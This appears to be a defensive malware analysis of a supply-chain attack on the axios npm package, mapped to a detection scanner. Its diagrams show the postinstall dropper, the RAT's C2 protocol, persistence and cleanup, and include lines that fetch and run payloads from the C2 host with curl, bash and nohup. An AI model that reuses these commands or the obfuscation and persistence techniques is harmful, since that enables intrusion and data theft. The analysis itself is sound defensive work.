# Attack Flow — Axios Supply Chain RAT

## Kill Chain Overview

```mermaid
stateDiagram-v2
    [*] --> AccountTakeover: npm account "jasonsaayman" hijacked

    state AccountTakeover {
        [*] --> EmailChanged: email → ifstap@proton.me
        EmailChanged --> PublishDecoy: plain-crypto-js@4.2.0 (clean)
        PublishDecoy --> PublishMalicious: plain-crypto-js@4.2.1 (backdoor)
        PublishMalicious --> InjectAxios114: axios@1.14.1 (tagged latest)
        PublishMalicious --> InjectAxios0304: axios@0.30.4 (tagged legacy)
    }

    AccountTakeover --> VictimInstall: developer runs npm install

    state VictimInstall {
        [*] --> ResolveDeps: npm resolves axios → compromised version
        ResolveDeps --> InstallPlainCrypto: plain-crypto-js@4.2.1 installed
        InstallPlainCrypto --> PostInstall: postinstall hook fires
        PostInstall --> RunSetupJS: node setup.js
    }

    VictimInstall --> Dropper

    state Dropper {
        [*] --> Deobfuscate: reverse string → base64 → XOR (OrDeR_7077)
        Deobfuscate --> DetectOS
        DetectOS --> FetchMacOS: macOS → osascript payload
        DetectOS --> FetchWindows: Windows → PowerShell + VBScript
        DetectOS --> FetchLinux: Linux → shell → python
        FetchMacOS --> SelfClean
        FetchWindows --> SelfClean
        FetchLinux --> SelfClean
        SelfClean --> [*]: delete setup.js, swap package.json
    }

    Dropper --> RAT

    state RAT {
        [*] --> Install

        state Install {
            MacOS: /Library/Caches/com.apple.act.mond
            Windows: %PROGRAMDATA%\\wt.exe + system.bat
            Linux: /tmp/ld.py
        }

        Install --> Beacon: HTTP POST every 60s
        Beacon --> C2: sfrclak.com:8000

        state C2 {
            FirstInfo: System fingerprint
            RunScript: Execute commands
            PEInject: In-memory DLL (Windows)
            RunDir: Directory listing
            Kill: Self-destruct
        }
    }

    RAT --> [*]: Full remote access achieved
```

---

## Dropper Execution Sequence (setup.js)

```mermaid
sequenceDiagram
    participant npm
    participant Node as node setup.js
    participant Decode as Deobfuscation
    participant OS as OS Detection
    participant C2 as C2 Server
    participant Disk as Local Filesystem

    npm->>Node: postinstall hook triggers
    Node->>Decode: Read stq encoded array
    Decode->>Decode: Reverse each string
    Decode->>Decode: Base64 decode
    Decode->>Decode: XOR decrypt with key OrDeR_7077
    Decode-->>Node: Decoded strings

    Node->>OS: process.platform check

    alt macOS darwin
        Node->>Disk: Write AppleScript to /tmp
        Node->>OS: osascript executes .scpt
        OS->>C2: GET /6202033 fetch binary
        C2-->>Disk: Write /Library/Caches/com.apple.act.mond
        Disk->>OS: /bin/zsh executes binary
    else Windows win32
        Node->>Disk: Copy powershell.exe to ProgramData as wt.exe
        Node->>Disk: Write 6202033.vbs and 6202033.ps1 to TEMP
        Node->>Disk: Write system.bat to ProgramData
        Node->>Disk: Set Registry Run key MicrosoftUpdate
        Disk->>OS: wt.exe runs 6202033.ps1
    else Linux
        Node->>OS: bash curl to C2
        OS->>C2: GET /6202033 fetch python script
        C2-->>Disk: Write /tmp/ld.py
        OS->>OS: nohup python3 /tmp/ld.py
    end

    Note over Node,Disk: Anti-forensics cleanup
    Node->>Disk: Delete setup.js
    Node->>Disk: Delete malicious package.json
    Node->>Disk: Rename package.md to package.json
```

---

## C2 Beacon Protocol

```mermaid
sequenceDiagram
    participant RAT as RAT victim
    participant C2 as C2 sfrclak.com 8000

    Note over RAT: Generate 16-char random UID

    RAT->>C2: POST /6202033 with spoofed IE8 UA
    Note right of RAT: Body is Base64 JSON FirstInfo
    C2-->>RAT: 200 OK

    loop Every 60 seconds
        RAT->>C2: POST /6202033 BaseInfo beacon
        alt No pending commands
            C2-->>RAT: 200 OK empty
        else runscript
            C2-->>RAT: runscript command + payload
            RAT->>RAT: Execute script via shell
            RAT->>C2: CmdResult rsp_runscript
        else rundir
            C2-->>RAT: rundir command + path
            RAT->>RAT: Enumerate directory
            RAT->>C2: CmdResult rsp_rundir
        else peinject Windows only
            C2-->>RAT: peinject + base64 DLL
            RAT->>RAT: Load DLL in memory
            RAT->>C2: CmdResult rsp_peinject
        else kill
            C2-->>RAT: kill command
            RAT->>RAT: Self destruct
            RAT->>C2: CmdResult rsp_kill
        end
    end
```

**C2 Protocol Details:**
- Transport: HTTP POST to `/6202033`
- Encoding: Base64-encoded JSON body
- User-Agent: `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)`
- Message types outbound: FirstInfo, BaseInfo, CmdResult
- Commands inbound: runscript, rundir, peinject, kill

---

## Platform Execution Chains

```mermaid
stateDiagram-v2
    state macOS {
        [*] --> node_setup_js_mac: node setup.js
        node_setup_js_mac --> osascript: /usr/bin/osascript
        osascript --> fetch_mac: curl sfrclak.com:8000/6202033
        fetch_mac --> write_binary: /Library/Caches/com.apple.act.mond
        write_binary --> exec_zsh: /bin/zsh executes binary
        exec_zsh --> cpp_rat: C++ RAT beacons every 60s
    }

    state Windows {
        [*] --> node_setup_js_win: node setup.js
        node_setup_js_win --> copy_ps: copy powershell.exe → %PROGRAMDATA%\\wt.exe
        copy_ps --> write_vbs: %TEMP%\\6202033.vbs
        write_vbs --> write_ps1: %TEMP%\\6202033.ps1
        write_ps1 --> write_bat: %PROGRAMDATA%\\system.bat
        write_bat --> reg_persist: HKCU\\...\\Run\\MicrosoftUpdate
        reg_persist --> ps_rat: PowerShell RAT beacons every 60s
    }

    state Linux {
        [*] --> node_setup_js_lin: node setup.js
        node_setup_js_lin --> shell_cmd: bash -c "curl ... > /tmp/ld.py"
        shell_cmd --> nohup: nohup python3 /tmp/ld.py &
        nohup --> py_rat: Python RAT beacons every 60s (no persistence)
    }
```

---

## Detection Points

```mermaid
stateDiagram-v2
    state Detection {
        [*] --> Supply_Chain
        [*] --> Host_Artifacts
        [*] --> Runtime_Signals
        [*] --> Network_Indicators

        state Supply_Chain {
            pkg_json: package.json lists plain-crypto-js
            lockfile: lockfile pins axios 1.14.1 or 0.30.4
            nm_dir: node_modules/plain-crypto-js exists
            setup: setup.js SHA256 matches e10b1fa8...
        }

        state Host_Artifacts {
            mac_file: /Library/Caches/com.apple.act.mond
            win_file: %PROGRAMDATA%\\wt.exe + system.bat
            lin_file: /tmp/ld.py
            tmp_file: $TMPDIR/6202033
            reg_key: Registry Run\\MicrosoftUpdate
            vbs_file: %TEMP%\\6202033.vbs
        }

        state Runtime_Signals {
            process: RAT process running (wt.exe / com.apple.act.mond / python ld.py)
            user_agent: IE8/WinXP UA string on any platform
            node_child: node → shell → curl/wget chain
            ps_flags: powershell -NoProfile -ep Bypass
        }

        state Network_Indicators {
            c2_ip: TCP connection to 142.11.206.73
            c2_domain: DNS lookup for sfrclak.com
            c2_port: Egress on port 8000
            beacon: HTTP POST every 60s, base64 JSON body
            fake_ua: User-Agent mozilla/4.0 msie 8.0 windows nt 5.1
        }
    }
```

---

## What the Scanner Checks (mapped to attack stages)

```mermaid
sequenceDiagram
    participant Scanner as axios-rat-scan
    participant Host as Host System
    participant FS as Filesystem
    participant Reg as Registry
    participant Proc as Process Table
    participant Net as Network Stack

    Note over Scanner: Phase 0 Host-level checks

    Scanner->>FS: Check RAT file artifacts + SHA-256 hashes
    FS-->>Scanner: Report any matches

    Scanner->>Reg: Read HKCU and HKLM Run keys
    Reg-->>Scanner: Flag MicrosoftUpdate or suspicious values

    Scanner->>Proc: Enumerate all processes
    Proc-->>Scanner: Flag RAT processes and C2 indicators

    Scanner->>Net: Parse netstat + DNS cache + hosts file
    Net-->>Scanner: Flag C2 connections and domain resolutions

    Note over Scanner: Phase 1 Discovery walkdir

    Scanner->>FS: Walk all drives collecting npm targets
    FS-->>Scanner: npm_sources_map.yml written + tree displayed

    Note over Scanner: Phase 2 IOC scan parallel via rayon

    par package.json files
        Scanner->>FS: Check deps and postinstall hooks
    and lockfiles + pnpm-lock.yaml
        Scanner->>FS: Check versions and integrity hashes
    and yarn.lock
        Scanner->>FS: Regex scan for compromised versions
    and node_modules
        Scanner->>FS: Check installed packages and dropper
    end

    Scanner-->>Scanner: Merge findings and sort by severity
    Scanner->>Host: Print report + REPORT.txt + exit code
```

---

## Attribution Context

```
WAVESHAPER backdoor (Mandiant)
    └── UNC1069 (DPRK-linked threat cluster)
         └── axios supply chain attack (2026-03-31)
              ├── axios@1.14.1 (sha: 2553649f...)
              ├── axios@0.30.4 (sha: d6f3f62f...)
              ├── plain-crypto-js@4.2.1 (sha: 07d889e2...)
              ├── @shadanai/openclaw (4 versions)
              └── @qqbrowser/openclaw-qbot@0.0.130
```

---

## IOC Quick Reference

| Type | Value |
|---|---|
| C2 Domain | `sfrclak[.]com` |
| C2 IP | `142.11.206[.]73` |
| C2 Port | `8000` |
| C2 Endpoint | `/6202033` |
| User-Agent | `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)` |
| XOR Key | `OrDeR_7077` (index: `7 * i² % 10`) |
| setup.js SHA-256 | `e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09` |
| macOS RAT SHA-256 | `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` |
| Win PS1 SHA-256 | `ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c` |
| Win PS1 SHA-256 (alt) | `617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101` |
| Win BAT SHA-256 | `e49c2732fb9861548208a78e72996b9c3c470b6b562576924bcc3a9fb75bf9ff` |
| Linux RAT SHA-256 | `6483c004e207137385f480909d6edecf1b699087378aa91745ecba7c3394f9d7` |
| Linux RAT SHA-256 (alt) | `fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf` |
| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate` |
